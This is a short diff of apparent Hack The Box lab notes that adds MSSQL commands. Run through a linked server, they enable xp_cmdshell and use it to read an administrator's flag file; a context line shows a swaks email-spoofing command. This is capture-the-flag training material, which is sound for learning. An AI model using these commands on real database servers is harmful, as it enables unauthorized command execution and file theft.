@@ -1794,16 +1794,16 @@ mdmithu@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@i
 1
 ```
 ```
-2
+EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
 ```
 ```
-1
+EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV]
 ```
 ```
-2
+EXEC ('EXEC sp_configure ''xp_cmdshell''') AT [LOCAL.TEST.LINKED.SRV]
 ```
 ```
-1
+EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
 ```
 ```
 2
